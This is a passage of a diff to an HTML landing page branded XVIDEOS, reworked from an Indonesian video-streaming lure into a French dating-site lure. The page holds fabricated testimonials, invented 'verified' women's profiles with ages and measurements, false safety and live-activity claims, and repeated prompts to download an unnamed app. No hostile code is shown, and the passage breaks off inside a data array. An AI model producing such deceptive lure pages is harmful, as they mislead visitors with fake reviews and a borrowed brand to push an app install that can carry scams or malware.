+    .viewer-info .v-loc { font-size: 0.72rem; color: var(--rose); font-weight: 700; margin-top: 2px; }
 
-    /* ---------- Download popup ---------- */
+    /* ---- Floating CTA ---- */
+    .float-cta {
+      position: fixed;
+      bottom: 0; left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      z-index: 200;
+      padding: 0.7rem 1rem 1rem;
+      background: linear-gradient(0deg, rgba(255,247,248,0.98) 60%, rgba(255,247,248,0) 100%);
+      pointer-events: none;
+    }
+    .float-cta-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      width: 100%;
+      padding: 0.9rem;
+      border-radius: 999px;
+      font-size: 0.98rem;
+      font-weight: 800;
+      text-decoration: none;
+      cursor: pointer;
+      border: none;
+      background: linear-gradient(135deg, var(--rose), #ec4899);
+      color: #fff;
+      pointer-events: auto;
+      position: relative;
+      overflow: hidden;
+      animation: breathe 1.8s ease-in-out infinite;
+      box-shadow: 0 8px 24px rgba(225, 29, 72, 0.35);
+    }
+    @keyframes breathe {
+      0%, 100% { box-shadow: 0 8px 24px rgba(225,29,72,0.35); transform: scale(1); }
+      50% { box-shadow: 0 10px 34px rgba(225,29,72,0.5); transform: scale(1.02); }
+    }
+    .float-cta-btn:active { transform: scale(0.97); animation: none; }
+    .float-cta-btn::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -80%;
+      width: 50%; height: 100%;
+      background: linear-gradient(105deg, transparent, rgba(255,255,255,0.55), transparent);
+      transform: skewX(-20deg);
+      animation: shine 2.6s ease-in-out infinite;
+    }
+    @keyframes shine {
+      0% { left: -80%; }
+      55%, 100% { left: 130%; }
+    }
+    .cta-free {
+      background: #fff;
+      color: var(--rose);
+      font-size: 0.62rem;
+      font-weight: 900;
+      letter-spacing: 0.05em;
+      padding: 2px 8px;
+      border-radius: 999px;
+    }
+
+    .ft { text-align: center; padding: 0.9rem; font-size: 0.6rem; color: var(--muted); }
+
+    /* ---- Video player (first screen) ---- */
+    .video-player {
+      margin: 1.2rem 0 0;
+      aspect-ratio: 16 / 9;
+      background: #000;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 12px 34px rgba(225, 29, 72, 0.16);
+      border: 1px solid var(--line);
+    }
+    .video-player video { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+    /* ---- Download popup ---- */
     .dl-overlay {
       display: none;
       position: fixed;
       inset: 0;
       z-index: 1000;
-      background: rgba(6, 6, 8, 0.7);
-      backdrop-filter: blur(6px);
+      background: rgba(31, 41, 55, 0.55);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
       align-items: center;
       justify-content: center;
-      padding: 22px;
+      padding: 1.5rem;
     }
     .dl-overlay.on { display: flex; }
     .dl-card {
       width: 100%;
-      max-width: 380px;
-      background: var(--surface);
-      border: 1px solid var(--line-2);
+      max-width: 360px;
+      background: var(--card);
       border-radius: 24px;
-      padding: 34px 26px 28px;
+      padding: 2rem 1.5rem 1.7rem;
       text-align: center;
-      box-shadow: 0 40px 90px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,178,39,0.10);
+      box-shadow: 0 24px 60px rgba(0, 0, 0, 0.3);
       cursor: pointer;
       animation: popIn 0.25s ease-out;
       position: relative;
     }
     .dl-close {
       position: absolute;
-      top: 14px; right: 14px;
-      width: 34px; height: 34px;
+      top: 12px; right: 12px;
+      width: 32px; height: 32px;
       border-radius: 50%;
-      background: var(--surface-2);
+      background: rgba(31, 41, 55, 0.08);
       color: var(--muted-2);
-      display: flex; align-items: center; justify-content: center;
-      font-size: 1.4rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.3rem;
       line-height: 1;
       cursor: pointer;
       border: none;
       font-weight: 700;
     }
     @keyframes popIn {
-      from { transform: scale(0.92); opacity: 0; }
+      from { transform: scale(0.9); opacity: 0; }
       to { transform: scale(1); opacity: 1; }
     }
     .dl-emoji { font-size: 2.6rem; line-height: 1; }
-    .dl-card h3 { font-family: 'Space Grotesk', sans-serif; font-size: 1.4rem; font-weight: 700; margin: 0.8rem 0 0.4rem; }
-    .dl-card p { font-size: 0.88rem; color: var(--muted-2); line-height: 1.55; }
+    .dl-card h3 { font-size: 1.25rem; font-weight: 900; margin: 0.7rem 0 0.4rem; color: var(--ink); }
+    .dl-card p { font-size: 0.85rem; color: var(--muted-2); line-height: 1.5; }
     .dl-btn {
       display: block;
       width: 100%;
-      margin-top: 1.3rem;
-      padding: 0.9rem;
-      border-radius: 12px;
-      background: var(--grad);
-      color: #1a1200;
+      margin-top: 1.25rem;
+      padding: 0.85rem;
+      border-radius: 999px;
+      background: linear-gradient(135deg, var(--rose), #ec4899);
+      color: #fff;
       font-weight: 800;
       font-size: 0.95rem;
-      box-shadow: 0 8px 24px rgba(255,178,39,0.28);
+      box-shadow: 0 8px 24px rgba(225, 29, 72, 0.35);
     }
-    .dl-list { margin: 1.2rem 0 0; text-align: left; }
+    .dl-sub { font-size: 0.85rem; color: var(--muted-2); line-height: 1.5; margin-top: 0.4rem; }
+    .dl-list { margin: 1.1rem 0 0; text-align: left; }
     .dl-item {
-      display: flex; align-items: center; gap: 10px;
-      font-size: 0.88rem; font-weight: 600; color: var(--text);
-      padding: 7px 0;
+      display: flex; align-items: center; gap: 9px;
+      font-size: 0.85rem; font-weight: 700; color: var(--ink);
+      padding: 6px 0;
     }
     .dl-chk {
       flex-shrink: 0;
-      width: 22px; height: 22px; border-radius: 50%;
-      background: rgba(46, 230, 168, 0.14); color: var(--emerald);
+      width: 20px; height: 20px; border-radius: 50%;
+      background: rgba(16, 185, 129, 0.14); color: var(--emerald);
       display: inline-flex; align-items: center; justify-content: center;
-      font-size: 0.72rem; font-weight: 900;
+      font-size: 0.7rem; font-weight: 900;
     }
-    .dl-note { font-size: 0.7rem; color: var(--muted); margin-top: 0.9rem; }
-
-    /* ---------- Sticky mobile CTA ---------- */
-    .mobile-cta {
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      z-index: 200;
-      padding: 12px 16px 16px;
-      background: linear-gradient(0deg, rgba(10,10,12,0.96) 60%, rgba(10,10,12,0) 100%);
-    }
-    .mobile-cta .btn { width: 100%; }
-    @media (min-width: 960px) { .mobile-cta { display: none; } }
-    body { padding-bottom: 84px; }
-    @media (min-width: 960px) { body { padding-bottom: 0; } }
-
-    /* ---------- Mobile refinements ---------- */
-    @media (max-width: 640px) {
-      .wrap { padding: 0 16px; }
-      .hero { padding: 32px 0 36px; }
-      .sec { padding: 40px 0; }
-      .header-right .btn { display: none; }
-      .hero-cta { margin-bottom: 26px; }
-      .stat { padding: 0 12px; }
-      .stat-num { font-size: 1.35rem; }
-      .sec-title { font-size: clamp(1.5rem, 7vw, 2rem); }
-      .cta-panel { padding: 40px 18px; }
-      .video-frame { border-radius: 16px; }
-      .avatar-stack img { width: 46px; height: 46px; }
-      .review-card { padding: 20px 18px; }
-    }
+    .dl-note { font-size: 0.68rem; color: var(--muted); margin-top: 0.85rem; }
   </style>
 </head>
 <body>
 
-  <!-- Header -->
-  <header class="site-header">
-    <div class="wrap header-inner">
-      <img class="logo" src="images/s2.jpg" alt="logo">
-      <div class="header-right">
-        <span class="pill"><span class="dot"></span>Online</span>
-        <a href="javascript:void(0)" class="btn btn-sm" onclick="k2(event)">🎬 Tonton Sekarang</a>
-      </div>
-    </div>
-  </header>
+  <!-- Top bar -->
+  <div class="topbar">
+    <img class="logo" src="images/s2.jpg" alt="logo">
+    <div class="topbar-pill"><span class="dot"></span>En ligne</div>
+  </div>
 
   <!-- Hero -->
   <section class="hero">
-    <div class="wrap hero-grid">
-      <div>
-        <div class="hero-badge"><span class="dot"></span>LIVE · Streaming Video</div>
-        <h1>Tonton<br><span class="gt">Video Tak Terbatas</span></h1>
-        <p class="hero-sub">Video HD langsung diputar – Konten baru setiap hari, tonton kapan pun tanpa batas..</p>
-        <div class="hero-cta">
-          <a href="javascript:void(0)" class="btn" onclick="k2(event)">🎬 Tonton Sekarang <span class="free">Gratis</span></a>
-        </div>
-        <div class="hero-proof">
-          <span class="proof-stars">★★★★★</span>
-          <span class="proof-text"><strong>4.9/5</strong> · 5 juta+ unduhan</span>
-        </div>
-        <div class="stats">
-          <div class="stat"><div class="stat-num">100%</div><div class="stat-label">Gratis selamanya</div></div>
-          <div class="stat"><div class="stat-num">24/7</div><div class="stat-label">Tayang nonstop</div></div>
-          <div class="stat"><div class="stat-num">Instan</div><div class="stat-label">Putar seketika</div></div>
-        </div>
-      </div>
-      <div class="hero-media">
-        <div class="video-frame">
-          <video id="myVideo" controls autoplay muted playsinline webkit-playsinline style="width:100%;height:100%;">
-            <source src="video.webm" type="video/webm">
-          </video>
-        </div>
-        <div class="live-badge"><span class="dot"></span>12,480 menonton sekarang</div>
-        <div class="avatar-stack">
-          <img src="images/c1.jpg" alt="">
-          <img src="images/c2.jpg" alt="">
-          <img src="images/c3.jpg" alt="">
-          <img src="images/c4.jpg" alt="">
-          <img src="images/c5.jpg" alt="">
-        </div>
-      </div>
-    </div>
-  </section>
+    <div class="hero-badge"><span class="dot"></span>LIVE · Rencontres décontractées</div>
+    <h1>Trouvez votre<span class="gt"> Partenaire Idéal</span></h1>
+    <p class="hero-sub"> Vidéo en ligne en temps réel – De vraies personnes sont en ligne en ce moment, chat vidéo instantané.</p>
 
-  <!-- Benefits -->
-  <section class="sec" style="padding-top:0">
-    <div class="wrap">
-      <div class="benefits">
-        <div class="b-chip"><span class="b-ic">🎬</span>Video HD jernih</div>
-        <div class="b-chip"><span class="b-ic">🚫</span>Tanpa iklan</div>
-        <div class="b-chip"><span class="b-ic">♾️</span>Nonton tanpa batas</div>
-        <div class="b-chip"><span class="b-ic">🔒</span>Aman &amp; pribadi</div>
-      </div>
+    <!-- Video player -->
+         <!-- Video player -->
+    <div class="video-player">
+      <video id="myVideo" controls autoplay muted playsinline webkit-playsinline style="width:100%; height:100%;">
+        <source src="video.webm" type="video/webm">
+      </video>
+    </div>
+
+    <div class="avatar-stack">
+      <img src="images/10-1.jpg" alt="">
+      <img src="images/9-1.jpg" alt="">
+      <img src="images/8-1.jpg" alt="">
+      <img src="images/7-1.jpg" alt="">
+      <img src="images/6-1.jpg" alt="">
+    </div>
+    <div class="stats-row">
+      <div><div class="stat-num">100%</div><div class="stat-label">Inscription gratuite</div></div>
+      <div><div class="stat-num">24h/7j</div><div class="stat-label">Vrais membres</div></div>
+      <div><div class="stat-num">Instantané</div><div class="stat-label">Match</div></div>
     </div>
   </section>
 
   <!-- Hot picks -->
-  <section class="sec">
-    <div class="wrap">
-      <div class="sec-head">
-        <span class="sec-tag">🔥 Paling Banyak Ditonton Saat Ini</span>
-        <h2 class="sec-title">Video Terpopuler Malam Ini</h2>
-        <p class="sec-sub"><span class="accent">Orang</span> sedang menonton sekarang</p>
-      </div>
-      <div class="hot-marquee"><div class="hot-track" id="hotGrid"></div></div>
+  <section class="sec" style="padding-top:0.6rem">
+    <div class="sec-head">
+      <div class="sec-tag">🔥 Les plus vues en ce moment</div>
+      <h2 class="sec-title">Qui est disponible ce soir</h2>
+      <p class="sec-sub"><span style="color:var(--emerald);font-weight:700">Personnes</span> connectées maintenant</p>
     </div>
+    <div class="hot-scroll" id="hotScroll"></div>
+    <div class="hot-dots" id="hotDots"></div>
   </section>
 
   <!-- Main list -->
-  <section class="sec" style="padding-top:0">
-    <div class="wrap">
-      <div class="sec-head">
-        <h2 class="sec-title">Tonton Video Malam Ini</h2>
-        <p class="sec-sub">Jelajahi videonya. Siap diputar sekarang.</p>
-      </div>
-      <div class="grid" id="userGrid"></div>
+  <section class="sec">
+    <div class="sec-head">
+      <h2 class="sec-title">Rencontrez-les ce soir</h2>
+      <p class="sec-sub">Parcourez leurs photos. Elles sont prêtes à vous rencontrer.</p>
     </div>
+    <div class="user-list" id="userList"></div>
   </section>
 
   <!-- Safety -->
-  <section class="safety-band sec">
-    <div class="wrap">
-      <div class="sec-head center">
-        <h2 class="sec-title">Aman &amp; Pribadi</h2>
+  <section class="sec" style="background:rgba(255,255,255,0.5)">
+    <h2 class="sec-title" style="text-align:center;margin-bottom:0.9rem">Sûr et privé</h2>
+    <div class="safety-grid">
+      <div class="safety-item">
+        <div class="ic" style="background:rgba(16,185,129,0.12)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+        </div>
+        <div class="t">Confidentialité</div>
+        <div class="d">Votre identité est protégée</div>
       </div>
-      <div class="safety-grid">
-        <div class="safety-item">
-          <div class="ic" style="background:rgba(46,230,168,0.12)">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#2ee6a8" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-          </div>
-          <div class="t">Privasi</div>
-          <div class="d">Identitas Anda terlindungi</div>
+      <div class="safety-item">
+        <div class="ic" style="background:rgba(245,158,11,0.12)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="1.8"><circle cx="12" cy="12" r="10"></circle><path d="M9 12l2 2 4-4"></path></svg>
         </div>
-        <div class="safety-item">
-          <div class="ic" style="background:rgba(255,178,39,0.12)">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ffb627" stroke-width="1.8"><circle cx="12" cy="12" r="10"></circle><path d="M9 12l2 2 4-4"></path></svg>
-          </div>
-          <div class="t">Terverifikasi</div>
-          <div class="d">Semua video ditinjau</div>
+        <div class="t">Vérifié</div>
+        <div class="d">Tous les profils sont vérifiés</div>
+      </div>
+      <div class="safety-item">
+        <div class="ic" style="background:rgba(59,130,246,0.12)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="1.8"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
         </div>
-        <div class="safety-item">
-          <div class="ic" style="background:rgba(124,92,255,0.14)">
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#7c5cff" stroke-width="1.8"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-          </div>
-          <div class="t">Dukungan</div>
-          <div class="d">Bantuan saat Anda membutuhkannya</div>
-        </div>
+        <div class="t">Assistance</div>
+        <div class="d">De l'aide quand vous en avez besoin</div>
       </div>
     </div>
   </section>
 
   <!-- Reviews -->
   <section class="sec">
-    <div class="wrap">
-      <div class="sec-head center">
-        <h2 class="sec-title">Kata Mereka</h2>
-        <p class="sec-sub">Kisah nyata dari orang-orang yang menikmati videonya</p>
-      </div>
-      <div class="review-grid">
-        <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Video di sini kualitasnya luar biasa. Putar seketika tanpa buffering, gambarnya jernih. Sudah jadi langganan saya setiap malam!"</p><div class="review-author"><img src="images/c1.jpg" alt=""><div><div class="review-author-name">Emeka</div><div class="review-author-role">Pengguna terverifikasi</div></div></div></div>
-        <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Semua konten di sini asli dan lengkap. Tanpa iklan yang mengganggu, tanpa ribet. Saya menemukan banyak video favorit dalam 2 minggu."</p><div class="review-author"><img src="images/c2.jpg" alt=""><div><div class="review-author-name">Tunde</div><div class="review-author-role">Pengguna terverifikasi</div></div></div></div>
-        <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Awalnya saya ragu, tapi setelah mencoba ternyata loading-nya cepat dan koleksinya lengkap. Tontonannya HD. Saya pasti nonton lagi malam ini!"</p><div class="review-author"><img src="images/c3.jpg" alt=""><div><div class="review-author-name">David</div><div class="review-author-role">Pengguna terverifikasi</div></div></div></div>
-        <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Sangat mudah menemukan video yang benar-benar Anda suka. Semua terorganisir rapi. Tanpa buang waktu, langsung putar dan nikmati."</p><div class="review-author"><img src="images/c4.jpg" alt=""><div><div class="review-author-name">Chuka</div><div class="review-author-role">Pengguna terverifikasi</div></div></div></div>
-        <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Saya daftar hari Kamis, langsung bisa nonton malam itu juga. Videonya jernih dan banyak pilihan. Pengalaman paling nyaman yang pernah saya coba."</p><div class="review-author"><img src="images/c5.jpg" alt=""><div><div class="review-author-name">Femi</div><div class="review-author-role">Pengguna terverifikasi</div></div></div></div>
-      </div>
+    <div class="sec-head">
+      <h2 class="sec-title">Ce qu'ils disent</h2>
+      <p class="sec-sub">De vraies histoires de personnes qui ont trouvé leur partenaire</p>
+    </div>
+    <div class="review-scroll" id="reviewScroll">
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« J'ai rencontré une fille incroyable ici vendredi dernier. Nous avons discuté, puis pris un verre le soir même et l'alchimie a été immédiate. Le meilleur rendez-vous depuis des années ! »</p><div class="review-author"><img src="images/c1.jpg" alt=""><div><div class="review-author-name">Emeka</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« Tout le monde ici est réel et authentique. Pas de faux profils, pas de jeux. J'ai rencontré 3 femmes formidables en 2 semaines. Chaque rendez-vous était meilleur que le précédent ! »</p><div class="review-author"><img src="images/c2.jpg" alt=""><div><div class="review-author-name">Tunde</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« J'étais sceptique, mais j'ai rencontré Blessing et le courant est passé instantanément. Nous avons partagé un dîner incroyable. Je la reverrai ce week-end ! »</p><div class="review-author"><img src="images/c3.jpg" alt=""><div><div class="review-author-name">David</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« C'est tellement facile de trouver quelqu'un avec qui on se connecte vraiment. Vous voyez exactement à qui vous parlez. Pas de temps perdu, juste de vrais rendez-vous avec de vraies personnes. »</p><div class="review-author"><img src="images/c4.jpg" alt=""><div><div class="review-author-name">Chuka</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« Je me suis inscrit jeudi et j'ai eu un rendez-vous vendredi soir. Nous sommes allés prendre un café et avons parlé pendant des heures. De loin la connexion la plus naturelle que j'aie jamais eue. »</p><div class="review-author"><img src="images/c5.jpg" alt=""><div><div class="review-author-name">Femi</div><div class="review-author-role">Membre vérifié</div></div></div></div>
     </div>
   </section>
-
-  <!-- CTA band -->
-  <section class="cta-band">
-    <div class="wrap">
-      <div class="cta-panel">
-        <a href="javascript:void(0)" class="btn" onclick="k2(event)">🎬 Tonton Sekarang <span class="free">Gratis</span></a>
-        <p class="cta-trust">✓ Tanpa kartu kredit &nbsp;·&nbsp; ✓ HD tanpa iklan &nbsp;·&nbsp; ✓ 100% aman</p>
-      </div>
-    </div>
-  </section>
-
-  <div class="ft">XVIDEOS · Streaming video favorit Anda</div>
 
   <!-- Viewer -->
   <div class="viewer" id="viewer">
-    <button class="viewer-close" onclick="closeViewer()" aria-label="Tutup">×</button>
+    <button class="viewer-close" onclick="closeViewer()" aria-label="Fermer">×</button>
     <div class="viewer-frame"><img id="vImg" src="" alt=""></div>
     <div class="viewer-info" id="vInfo"></div>
   </div>
 
-  <!-- Sticky mobile CTA -->
-  <div class="mobile-cta">
-    <a href="javascript:void(0)" class="btn" onclick="k2(event)">🎬 Tonton Sekarang <span class="free">Gratis</span></a>
+  <!-- Floating CTA -->
+  <div class="float-cta">
+    <a href="javascript:void(0)" class="float-cta-btn" onclick="k2(event)">💘 Téléchargez l'app maintenant. <span class="cta-free">Gratuit</span></a>
   </div>
+
+  <div class="ft">XVIDEOS · Connectez-vous avec des célibataires près de chez vous</div>
 
   <!-- Download popup -->
   <div class="dl-overlay" id="dlOverlay" onclick="k2(event)">
     <div class="dl-card">
-      <button class="dl-close" onclick="event.stopPropagation(); closeDownload()" aria-label="Tutup">×</button>
+      <button class="dl-close" onclick="event.stopPropagation(); closeDownload()" aria-label="Fermer">×</button>
 
-      <h3>Buka Akses Penuh</h3>
-      <p class="dl-sub">Unduh aplikasinya untuk menonton semua video gratis — setiap video, kategori, dan koleksi.</p>
+      <h3>Débloquez l'accès complet</h3>
+      <p class="dl-sub">Téléchargez l'app pour tout regarder gratuitement — chaque profil, photo et discussion.</p>
       <div class="dl-list">
-        <div class="dl-item"><span class="dl-chk">✓</span>100% gratis untuk menonton</div>
-        <div class="dl-item"><span class="dl-chk">✓</span>Akses setiap video &amp; kategori</div>
-        <div class="dl-item"><span class="dl-chk">✓</span>Tonton video HD tanpa buffering</div>
+        <div class="dl-item"><span class="dl-chk">✓</span>Inscription 100% gratuite</div>
+        <div class="dl-item"><span class="dl-chk">✓</span>Voir chaque profil et photo</div>
+        <div class="dl-item"><span class="dl-chk">✓</span>Discutez avec de vrais célibataires près de chez vous</div>
       </div>
-      <span class="dl-btn">Dapatkan Aplikasinya Gratis · Tonton Sekarang</span>
-      <div class="dl-note">🔒 Aman &amp; pribadi — tanpa perlu kartu kredit</div>
+      <span class="dl-btn">Obtenez l'app gratuitement · Commencez maintenant</span>
+      <div class="dl-note">🔒 Sécurisé et privé — aucune carte bancaire requise</div>
     </div>
   </div>
 
   <script>
     var USERS = [
-      {n:1, name:'Ada',      age:20, job:'Penata rias',      h:'173cm', w:'116lbs', loc:'Lagos',          badge:'Online', bt:'online'},
-      {n:2, name:'Darlene',  age:22, job:'Mahasiswi',        h:'176cm', w:'109lbs', loc:'Abuja',          badge:'Populer',  bt:'hot'},
-      {n:3, name:'Alma',     age:25, job:'Mahasiswi',        h:'165cm', w:'112lbs', loc:'Port Harcourt',  badge:'Baru',    bt:'new'},
-      {n:4, name:'Bonnie',   age:26, job:'Pelatih kebugaran',h:'168cm', w:'116lbs', loc:'Kano',           badge:'Online', bt:'online'},
-      {n:5, name:'Dora',     age:24, job:'Dokter',           h:'165cm', w:'104lbs', loc:'Ibadan',         badge:'Populer',  bt:'hot'},
-      {n:6, name:'Camille',  age:24, job:'Dokter',           h:'165cm', w:'104lbs', loc:'Enugu',          badge:'Online', bt:'online'},
-      {n:7, name:'Cara',     age:26, job:'Fotografer',       h:'168cm', w:'113lbs', loc:'Benin City',     badge:'Baru',    bt:'new'},
-      {n:8, name:'Debby',    age:21, job:'Mahasiswi',        h:'168cm', w:'108lbs', loc:'Owerri',         badge:'Online', bt:'online'},
-      {n:9, name:'Fanny',    age:23, job:'Mahasiswi',        h:'167cm', w:'115lbs', loc:'Kaduna',         badge:'Populer',  bt:'hot'},
-      {n:10,name:'Elaine',   age:25, job:'Mahasiswi',        h:'170cm', w:'122lbs', loc:'Abeokuta',       badge:'Online', bt:'online'},
-      {n:11,name:'Gemma',    age:28, job:'Fotografer',       h:'172cm', w:'125lbs', loc:'Onitsha',        badge:'Baru',    bt:'new'},
-      {n:12,name:'Hedy',     age:22, job:'Penata rias',      h:'166cm', w:'108lbs', loc:'Warri',          badge:'Online', bt:'online'},
-      {n:1, name:'Hulda',    age:27, job:'Akuntan',          h:'169cm', w:'120lbs', loc:'Calabar',        badge:'Populer',  bt:'hot'},
-      {n:2, name:'Jade',     age:24, job:'Mahasiswi',        h:'164cm', w:'110lbs', loc:'Uyo',            badge:'Online', bt:'online'},
-      {n:3, name:'Joyce',    age:26, job:'Dokter',           h:'171cm', w:'118lbs', loc:'Jos',            badge:'Baru',    bt:'new'},
-      {n:4, name:'Kama',     age:25, job:'Apoteker',         h:'168cm', w:'113lbs', loc:'Maiduguri',      badge:'Online', bt:'online'},
-      {n:5, name:'Laura',    age:28, job:'Pelatih kebugaran',h:'174cm', w:'126lbs', loc:'Sokoto',         badge:'Populer',  bt:'hot'},
-      {n:6, name:'Elsie',    age:27, job:'Mahasiswi',        h:'167cm', w:'115lbs', loc:'Ilorin',         badge:'Online', bt:'online'},
-      {n:1, name:'Emma',     age:20, job:'Penata rias',      h:'173cm', w:'116lbs', loc:'Lagos',          badge:'Online', bt:'online'},
-      {n:2, name:'Olivia',   age:22, job:'Mahasiswi',        h:'176cm', w:'109lbs', loc:'Abuja',          badge:'Populer',  bt:'hot'},
-      {n:3, name:'Ava',      age:25, job:'Mahasiswi',        h:'165cm', w:'112lbs', loc:'Port Harcourt',  badge:'Baru',    bt:'new'},
-      {n:4, name:'Sophia',   age:26, job:'Pelatih kebugaran',h:'168cm', w:'116lbs', loc:'Kano',           badge:'Online', bt:'online'},
-      {n:5, name:'Isabella', age:24, job:'Mahasiswi',        h:'165cm', w:'104lbs', loc:'Ibadan',         badge:'Populer',  bt:'hot'},
-      {n:6, name:'Mia',      age:24, job:'Dokter',           h:'165cm', w:'104lbs', loc:'Enugu',          badge:'Online', bt:'online'},
-      {n:7, name:'Charlotte',age:26, job:'Fotografer',       h:'168cm', w:'113lbs', loc:'Benin City',     badge:'Baru',    bt:'new'},
-      {n:8, name:'Amelia',   age:21, job:'Mahasiswi',        h:'168cm', w:'108lbs', loc:'Owerri',         badge:'Online', bt:'online'},
-      {n:9, name:'Harper',   age:23, job:'Mahasiswi',        h:'167cm', w:'115lbs', loc:'Kaduna',         badge:'Populer',  bt:'hot'},
-      {n:10,name:'Evelyn',   age:25, job:'Mahasiswi',        h:'170cm', w:'122lbs', loc:'Abeokuta',       badge:'Online', bt:'online'},
-      {n:11,name:'Abigail',  age:28, job:'Fotografer',       h:'172cm', w:'125lbs', loc:'Onitsha',        badge:'Baru',    bt:'new'},
-      {n:12,name:'Lily',     age:22, job:'Penata rias',      h:'166cm', w:'108lbs', loc:'Warri',          badge:'Online', bt:'online'}
+      {n:1,  name:'Ada',       age:20, job:'Maquilleuse',   h:'173cm', w:'116lbs', badge:'En ligne',  bt:'online'},
+      {n:2,  name:'Darlene',   age:22, job:'Étudiante',     h:'176cm', w:'109lbs', badge:'Populaire', bt:'hot'},
+      {n:3,  name:'Alma',      age:25, job:'Étudiante',     h:'165cm', w:'112lbs', badge:'Nouvelle',  bt:'new'},
+      {n:4,  name:'Bonnie',    age:26, job:'Coach fitness', h:'168cm', w:'116lbs', badge:'En ligne',  bt:'online'},
+      {n:5,  name:'Dora',      age:24, job:'Médecin',       h:'165cm', w:'104lbs', badge:'Populaire', bt:'hot'},
+      {n:6,  name:'Camille',   age:24, job:'Médecin',       h:'165cm', w:'104lbs', badge:'En ligne',  bt:'online'},
+      {n:7,  name:'Cara',      age:26, job:'Photographe',   h:'168cm', w:'113lbs', badge:'Nouvelle',  bt:'new'},
+      {n:8,  name:'Debby',     age:21, job:'Étudiante',     h:'168cm', w:'108lbs', badge:'En ligne',  bt:'online'},
+      {n:9,  name:'Fanny',     age:23, job:'Étudiante',     h:'167cm', w:'115lbs', badge:'Populaire', bt:'hot'},
+      {n:10, name:'Elaine',    age:25, job:'Étudiante',     h:'170cm', w:'122lbs', badge:'En ligne',  bt:'online'},
+      {n:11, name:'Gemma',     age:28, job:'Photographe',   h:'172cm', w:'125lbs', badge:'Nouvelle',  bt:'new'},
+      {n:12, name:'Hedy',      age:22, job:'Maquilleuse',   h:'166cm', w:'108lbs', badge:'En ligne',  bt:'online'},
+      {n:1,  name:'Hulda',     age:27, job:'Comptable',     h:'169cm', w:'120lbs', badge:'Populaire', bt:'hot'},
+      {n:2,  name:'Jade',      age:24, job:'Étudiante',     h:'164cm', w:'110lbs', badge:'En ligne',  bt:'online'},
+      {n:3,  name:'Joyce',     age:26, job:'Médecin',       h:'171cm', w:'118lbs', badge:'Nouvelle',  bt:'new'},
+      {n:4,  name:'Kama',      age:25, job:'Pharmacienne',  h:'168cm', w:'113lbs', badge:'En ligne',  bt:'online'},
+      {n:5,  name:'Laura',     age:28, job:'Coach fitness', h:'174cm', w:'126lbs', badge:'Populaire', bt:'hot'},
+      {n:6,  name:'Elsie',     age:27, job:'Étudiante',     h:'167cm', w:'115lbs', badge:'En ligne',  bt:'online'},
+      {n:1,  name:'Emma',      age:20, job:'Maquilleuse',   h:'173cm', w:'116lbs', badge:'En ligne',  bt:'online'},
+      {n:2,  name:'Olivia',    age:22, job:'Étudiante',     h:'176cm', w:'109lbs', badge:'Populaire', bt:'hot'},
+      {n:3,  name:'Ava',       age:25, job:'Étudiante',     h:'165cm', w:'112lbs', badge:'Nouvelle',  bt:'new'},
+      {n:4,  name:'Sophia',    age:26, job:'Coach fitness', h:'168cm', w:'116lbs', badge:'En ligne',  bt:'online'},
+      {n:5,  name:'Isabella',  age:24, job:'Étudiante',     h:'165cm', w:'104lbs', badge:'Populaire', bt:'hot'},
+      {n:6,  name:'Mia',       age:24, job:'Médecin',       h:'165cm', w:'104lbs', badge:'En ligne',  bt:'online'},
+      {n:7,  name:'Charlotte', age:26, job:'Photographe',   h:'168cm', w:'113lbs', badge:'Nouvelle',  bt:'new'},
+      {n:8,  name:'Amelia',    age:21, job:'Étudiante',     h:'168cm', w:'108lbs', badge:'En ligne',  bt:'online'},
+      {n:9,  name:'Harper',    age:23, job:'Étudiante',     h:'167cm', w:'115lbs', badge:'Populaire', bt:'hot'},
+      {n:10, name:'Evelyn',    age:25, job:'Étudiante',     h:'170cm', w:'122lbs', badge:'En ligne',  bt:'online'},
+      {n:11, name:'Abigail',   age:28, job:'Photographe',   h:'172cm', w:'125lbs', badge:'Nouvelle',  bt:'new'},
+      {n:12, name:'Lily',      age:22, job:'Maquilleuse',   h:'166cm', w:'108lbs', badge:'En ligne',  bt:'online'}
     ];
 
     var HOT = [
-      {n:1, name:'Ada',     age:20, badge:'Populer',     bt:'popular',  views:'12.4K'},
